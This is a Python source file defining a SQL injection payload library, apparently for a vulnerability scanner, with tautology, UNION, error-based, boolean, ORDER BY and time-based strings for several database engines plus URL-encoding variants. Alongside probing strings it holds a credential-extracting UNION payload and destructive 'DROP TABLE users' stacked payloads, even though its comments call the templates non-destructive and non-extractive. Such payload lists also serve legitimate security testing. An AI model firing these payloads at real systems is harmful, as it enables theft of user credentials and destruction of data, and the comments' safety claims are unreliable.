class SQLPayloads:
    BASIC = [
        "'",
        "\"",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR '1'='1' --",
        "' UNION SELECT null --",
        "' UNION SELECT null,null --",
        "' AND 1=1 --",
        "' AND 1=2 --",
        "' OR SLEEP(5) --"
    ]
    
    BLIND = [
        "' AND SLEEP(5) --",
        "' OR IF(1=1,SLEEP(5),0) --",
        "' OR BENCHMARK(5000000,MD5('test')) --"
    ]
    
    ERROR = [
        "'",
        "\"",
        "';",
        "\";",
        "')",
        "\")",
        "'))",
        "\"))"
    ]
    
    # UNION-style probes (non-extractive templates)
    UNION = [
        "' UNION SELECT NULL --",
        '" UNION SELECT NULL --',
        "' UNION SELECT NULL,NULL --",
        "' UNION SELECT NULL,NULL,NULL --",
    ]

    # Boolean-based probes
    BOOLEAN = [
        "' AND 1=1 --",
        "' AND 1=2 --",
        '" AND 1=1 --',
        '" AND 1=2 --',
        "' OR '1'='1' --",
        '" OR "1"="1" --'
    ]

    # Order-by probes to detect column count issues (non-extractive)
    ORDER_BY = [
        "' ORDER BY 1 --",
        "' ORDER BY 2 --",
        "' ORDER BY 5 --",
        "' ORDER BY 10 --",
    ]

    # Time-based payloads for common DB engines (non-extractive)
    TIME_MYSQL = [
        "' AND SLEEP(5) --",
        "' OR IF(1=1,SLEEP(5),0) --",
        "' OR BENCHMARK(2000000,MD5('test')) --"
    ]

    TIME_PG = [
        "' ; SELECT pg_sleep(5); --",
        "' OR (SELECT pg_sleep(5)) --"
    ]

    TIME_MSSQL = [
        "' WAITFOR DELAY '00:00:05' --",
        "'; WAITFOR DELAY '00:00:05'--"
    ]
    
    @classmethod
    def get_all(cls):
        # Combine multiple categories; keep templates non-destructive and non-extractive
        parts = [
            cls.BASIC,
            cls.BLIND,
            cls.ERROR,
            getattr(cls, 'UNION', []),
            getattr(cls, 'BOOLEAN', []),
            getattr(cls, 'ORDER_BY', []),
            getattr(cls, 'TIME_MYSQL', []),
            getattr(cls, 'TIME_PG', []),
            getattr(cls, 'TIME_MSSQL', []),
        ]
        out = []
        for p in parts:
            for v in p:
                if v not in out:
                    out.append(v)
        return out

    @classmethod
    def get_categories(cls):
        """Return a dict of payload categories -> list of payloads."""
        return {
            'TAUTOLOGY': [
                "' OR '1'='1",
                '" OR "1"="1',
                "' OR 1=1 --",
                ' OR 1=1',
            ],
            'UNION': [
                "' UNION SELECT null --",
                "' UNION SELECT null,null --",
                "' UNION SELECT username,password FROM users --",
            ],
            'ERROR': cls.ERROR,
            'TIME': cls.BLIND + ["' OR SLEEP(5) --"],
            'BLIND': cls.BLIND,
            'STACKED': [
                "'; DROP TABLE users; --",
                "'; SELECT pg_sleep(5); --",
            ],
            'COMMENT': [
                "' --",
                '" --',
            ],
            'NUMERIC': [
                '1 OR 1=1',
                '1; DROP TABLE users',
            ],
            'HEX': [
                "0x27 OR 0x31=0x31",
            ],
            'BOOLEAN': [
                "' AND 'a'='a' --",
                "' AND 'a'='b' --",
            ],
            'BASIC': cls.BASIC,
        }

    @classmethod
    def variants(cls, payload):
        """Return common encoded variants of a payload to improve detection on real-world apps.

        Variants include:
         - raw
         - url-encoded
         - double url-encoded
         - plus-encoded (spaces -> +)
        """
        from urllib.parse import quote

        raw = payload
        urlenc = quote(payload, safe='')
        double = quote(urlenc, safe='')
        plus = payload.replace(' ', '+')
        # keep unique variants, preserve order
        seen = []
        for p in (raw, urlenc, double, plus):
            if p not in seen:
                seen.append(p)
        return seen

    @classmethod
    def all_with_categories(cls):
        """Yield (category, payload) pairs for all payloads in reasonable order."""
        cats = cls.get_categories()
        order = ['TAUTOLOGY', 'BOOLEAN', 'UNION', 'ERROR', 'TIME', 'BLIND', 'STACKED', 'COMMENT', 'NUMERIC', 'HEX', 'BASIC']
        for cat in order:
            for p in cats.get(cat, []):
                yield cat, p